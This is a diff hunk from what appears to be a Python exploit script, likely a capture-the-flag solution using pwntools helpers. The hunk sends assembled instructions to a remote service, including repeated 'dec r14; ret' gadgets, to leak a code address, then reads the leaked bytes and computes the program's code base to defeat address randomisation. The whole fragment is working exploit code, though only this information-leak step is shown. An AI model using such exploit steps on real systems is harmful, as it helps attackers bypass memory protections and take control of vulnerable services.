@@ -75,17 +75,17 @@ if __name__ == "__main__":
 
     r.settimeout(0.5)
 
+    #
+    # leak the address of 0x8a2: mov edx,6
+    #
     s('mov r14,[rsp]')
-    r.recvn(8)
     r.send( assemble('dec r14; ret') * (0xb18 - 0x8a2) )
     recv_all()
 
     s('push rsp; pop rsi; push r14')
-
     d = recv_all()
     l = d[len(d)-6:len(d)] + '\x00\x00'
     l = u64(l)
-
     B = l - 0x8a2
     log.info("code base: 0x%x" % B)
 
